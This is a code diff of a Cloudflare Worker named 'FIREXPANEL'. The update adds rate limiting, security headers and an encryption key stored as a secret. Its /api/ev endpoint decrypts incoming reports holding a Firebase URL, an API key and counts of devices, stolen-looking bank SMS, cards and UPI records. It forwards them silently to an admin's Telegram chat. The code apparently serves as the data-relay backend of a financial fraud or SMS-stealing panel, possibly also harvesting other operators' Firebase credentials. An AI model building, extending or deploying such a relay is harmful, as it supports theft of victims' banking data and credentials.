@@ -1,13 +1,18 @@
 /**
- * FIREXPANEL — Cloudflare Worker (Secure)
- * 
- * BOT_TOKEN and ADMIN_ID are NEVER in this code.
- * They exist ONLY as encrypted Cloudflare Secrets.
- * No logs, no errors, no responses ever leak them.
+ * FIREXPANEL — Cloudflare Worker (Secure v2)
+ *
+ * ALL secrets stored as Cloudflare encrypted secrets:
+ *   - BOT_TOKEN   (Telegram bot token)
+ *   - ADMIN_ID    (Telegram chat ID)
+ *   - ENC_KEY     (AES encryption passphrase)
+ *
+ * No sensitive data in source code.
  */
 
 const MAX_AGE_MS = 300000;
-const _C = [88,107,57,109,80,50,119,78,55,113,76,52,118,82,54,106,72,51,99,70,56,121,84,49,90,98,69,53,115,65,48,57];
+const RATE_LIMIT = 10;
+const RATE_WINDOW_MS = 600000;
+const MAX_BODY_SIZE = 65536;
 
 const CORS = {
   'Access-Control-Allow-Origin': '*',
@@ -15,24 +20,52 @@ const CORS = {
   'Access-Control-Allow-Methods': 'POST,OPTIONS',
 };
 
-// Constant-time string comparison to prevent timing attacks
-function safeEqual(a, b) {
-  if (a.length !== b.length) return false;
-  let result = 0;
-  for (let i = 0; i < a.length; i++) {
-    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
-  }
-  return result === 0;
+const SEC_HEADERS = {
+  'X-Content-Type-Options': 'nosniff',
+  'X-Frame-Options': 'DENY',
+  'Referrer-Policy': 'no-referrer',
+  'Cache-Control': 'no-store',
+};
+
+function safeResponse(body, status, extra) {
+  return new Response(body, {
+    status,
+    headers: { ...SEC_HEADERS, ...extra },
+  });
 }
 
-async function getAesKey() {
-  const s = _C.map(c => String.fromCharCode(c)).join('');
-  const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
+// --- Rate Limiter with cleanup ---
+const rateBuckets = new Map();
+
+function checkRate(ip) {
+  const now = Date.now();
+  // Cleanup stale entries every 50 requests
+  if (rateBuckets.size > 200) {
+    for (const [k, v] of rateBuckets) {
+      if (now >= v.resetAt) rateBuckets.delete(k);
+    }
+  }
+  let b = rateBuckets.get(ip);
+  if (!b || now >= b.resetAt) {
+    b = { count: 0, resetAt: now + RATE_WINDOW_MS };
+    rateBuckets.set(ip, b);
+  }
+  return ++b.count <= RATE_LIMIT;
+}
+
+// --- AES-GCM Decryption using secret key ---
+async function getAesKey(encKeyStr) {
+  const d = await crypto.subtle.digest(
+    'SHA-256',
+    new TextEncoder().encode(encKeyStr)
+  );
   return crypto.subtle.importKey('raw', d, { name: 'AES-GCM' }, false, ['decrypt']);
 }
 
 async function doDecrypt(b64, key) {
-  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+  const bytes = Uint8Array.from(atob(b64), function (c) {
+    return c.charCodeAt(0);
+  });
   const plain = await crypto.subtle.decrypt(
     { name: 'AES-GCM', iv: bytes.slice(0, 12) },
     key,
@@ -41,65 +74,96 @@ async function doDecrypt(b64, key) {
   return new TextDecoder().decode(plain);
 }
 
-const rateBuckets = new Map();
-function checkRate(ip) {
-  const now = Date.now();
-  let b = rateBuckets.get(ip);
-  if (!b || now >= b.resetAt) { b = { count: 0, resetAt: now + 600_000 }; rateBuckets.set(ip, b); }
-  return ++b.count <= 10;
-}
-
-// Secure Telegram send — never leaks token in any error/response
+// --- Telegram sender — never leaks token ---
 async function sendTelegram(botToken, chatId, text, parseMode) {
   try {
     const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
     const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: parseMode }),
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: parseMode,
+      }),
     });
     return res.ok;
-  } catch {
+  } catch (_e) {
     return false;
   }
 }
 
+// --- /api/ev handler ---
 async function handleEv(request, env) {
-  if (request.method === 'OPTIONS') return new Response(null, { status: 204, headers: CORS });
-  if (request.method !== 'POST')   return new Response(null, { status: 405, headers: CORS });
+  if (request.method === 'OPTIONS') {
+    return new Response(null, { status: 204, headers: { ...CORS, ...SEC_HEADERS } });
+  }
+  if (request.method !== 'POST') {
+    return new Response(null, { status: 405, headers: { ...CORS, ...SEC_HEADERS } });
+  }
 
-  // Validate secrets exist
   const botToken = env.BOT_TOKEN;
-  const adminId  = env.ADMIN_ID;
-  if (!botToken || !adminId) return new Response(null, { status: 200, headers: CORS });
+  const adminId = env.ADMIN_ID;
+  const encKey = env.ENC_KEY;
+  if (!botToken || !adminId || !encKey) {
+    return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+  }
 
-  const ip = (request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown')
-    .split(',')[0].trim();
-  if (!checkRate(ip)) return new Response(null, { status: 200, headers: CORS });
+  const ip = (
+    request.headers.get('CF-Connecting-IP') ||
+    request.headers.get('X-Forwarded-For') ||
+    'unknown'
+  ).split(',')[0].trim();
+
+  if (!checkRate(ip)) {
+    return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+  }
 
   try {
+    // Enforce body size limit
+    const contentLength = parseInt(request.headers.get('Content-Length') || '0', 10);
+    if (contentLength > MAX_BODY_SIZE) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
+
     let body;
-    try { body = await request.json(); } catch { return new Response(null, { status: 200, headers: CORS }); }
+    try {
+      body = await request.json();
+    } catch (_e) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
 
     const b64 = typeof body?.d === 'string' ? body.d : '';
-    if (!b64) return new Response(null, { status: 200, headers: CORS });
+    if (!b64) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
 
     let data;
     try {
-      const key = await getAesKey();
+      const key = await getAesKey(encKey);
       data = JSON.parse(await doDecrypt(b64, key));
-    } catch { return new Response(null, { status: 200, headers: CORS }); }
+    } catch (_e) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
 
-    if (!data.ts || Math.abs(Date.now() - Number(data.ts)) > MAX_AGE_MS)
-      return new Response(null, { status: 200, headers: CORS });
+    if (!data.ts || Math.abs(Date.now() - Number(data.ts)) > MAX_AGE_MS) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
 
     const {
-      firebaseUrl = '', apiKey = '',
-      total = 0, online = 0, offline = 0,
-      bankSms = 0, upiCount = 0, cardCount = 0,
+      firebaseUrl = '',
+      apiKey = '',
+      total = 0,
+      online = 0,
+      offline = 0,
+      bankSms = 0,
+      upiCount = 0,
+      cardCount = 0,
     } = data;
 
-    if (!firebaseUrl) return new Response(null, { status: 200, headers: CORS });
+    if (!firebaseUrl) {
+      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
+    }
 
     const msg =
       '🔥 *FIREXPANEL — New Firebase Connected*\n\n' +
@@ -111,23 +175,28 @@ async function handleEv(request, env) {
       '🏦 *Bank SMS:* ' + bankSms +
       '   💳 *Cards:* ' + cardCount +
       '   📲 *UPI:* ' + upiCount + '\n\n' +
-      '⏰ ' + new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) + ' IST';
+      '⏰ ' +
+      new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) +
+      ' IST';
 
     await sendTelegram(botToken, adminId, msg, 'Markdown');
-  } catch {
+  } catch (_e) {
     // Silent fail — never expose internals
   }
 
-  return new Response(null, { status: 200, headers: CORS });
+  return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
 }
 
+// --- /api/ping handler ---
 async function handlePing(env) {
   const botToken = env.BOT_TOKEN;
-  const adminId  = env.ADMIN_ID;
+  const adminId = env.ADMIN_ID;
   if (!botToken || !adminId) {
-    return new Response('❌ Secrets not configured. Set BOT_TOKEN and ADMIN_ID in Cloudflare.', {
-      status: 200, headers: { 'Content-Type': 'text/plain' }
-    });
+    return safeResponse(
+      '❌ Secrets not configured. Set BOT_TOKEN and ADMIN_ID via wrangler.',
+      200,
+      { 'Content-Type': 'text/plain' }
+    );
   }
 
   const text =
@@ -137,21 +206,33 @@ async function handlePing(env) {
     '🔒 Encrypted · 🚀 Cloudflare Powered · ⚡ Ready';
 
   const ok = await sendTelegram(botToken, adminId, text, 'Markdown');
-  return new Response(
-    ok ? '✅ Test message sent to Telegram! Check your bot.' : '❌ Failed to send. Verify secrets are correct.',
-    { status: 200, headers: { 'Content-Type': 'text/plain' } }
+  return safeResponse(
+    ok
+      ? '✅ Test message sent to Telegram! Check your bot.'
+      : '❌ Failed to send. Verify secrets are correct.',
+    200,
+    { 'Content-Type': 'text/plain' }
   );
 }
 
+// --- Main entrypoint ---
 export default {
   async fetch(request, env) {
-    // Block any attempt to read source or env via debug paths
-    const path = new URL(request.url).pathname;
+    try {
+      const path = new URL(request.url).pathname;
 
-    if (path === '/api/ev'   || path === '/api/ev/')   return handleEv(request, env);
-    if (path === '/api/ping' || path === '/api/ping/') return handlePing(env);
+      if (path === '/api/ev' || path === '/api/ev/') {
+        return handleEv(request, env);
+      }
+      if (path === '/api/ping' || path === '/api/ping/') {
+        return handlePing(env);
+      }
 
-    // Generic response — reveals nothing about internals
-    return new Response('OK', { status: 200 });
+      // Generic response — reveals nothing
+      return safeResponse('OK', 200, {});
+    } catch (_e) {
+      // Top-level catch — worker never crashes silently
+      return new Response('OK', { status: 200 });
+    }
   },
 };
